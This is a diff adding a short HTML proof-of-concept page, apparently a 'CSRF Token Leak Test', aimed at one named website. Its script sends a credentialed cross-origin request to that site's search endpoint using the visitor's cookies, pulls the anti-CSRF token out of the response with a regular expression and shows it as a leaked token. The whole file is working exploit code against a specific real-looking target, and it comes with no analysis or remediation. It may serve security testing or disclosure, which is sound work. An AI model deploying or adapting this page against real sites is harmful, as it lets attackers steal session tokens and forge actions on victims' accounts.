@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CSRF Token Leak Test</title>
+  </head>
+  <body>
+    <h1>CSRF Token Leak Result</h1>
+    <pre id="output">Loading...</pre>
+
+    <script>
+      fetch("https://mydata.zecible.fr/ajax.php?action=search&token=", {
+        credentials: "include"
+      })
+      .then(res => res.text())
+      .then(body => {
+        document.getElementById('output').textContent = body;
+
+        try {
+          const token = JSON.parse(body)?.message?.match(/"token":"([a-f0-9]+)"/)?.[1];
+          if (token) {
+            document.getElementById('output').textContent = "Leaked CSRF Token:\n" + token;
+          }
+        } catch (e) {
+          console.error("Token extraction error:", e);
+        }
+      })
+      .catch(err => {
+        document.getElementById('output').textContent = "Error:\n" + err;
+      });
+    </script>
+  </body>
+</html>
